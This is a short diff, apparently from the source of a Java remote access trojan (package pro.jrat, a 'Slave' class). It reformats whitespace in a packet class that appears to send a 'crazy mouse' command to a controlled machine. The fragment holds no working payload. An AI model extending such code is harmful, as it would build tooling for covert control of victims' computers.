@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet46CrazyMouse extends AbstractOutgoingPacket {
-	
+
 	private int seconds;
-	
+
 	public Packet46CrazyMouse(int seconds) {
 		this.seconds = seconds;
 	}
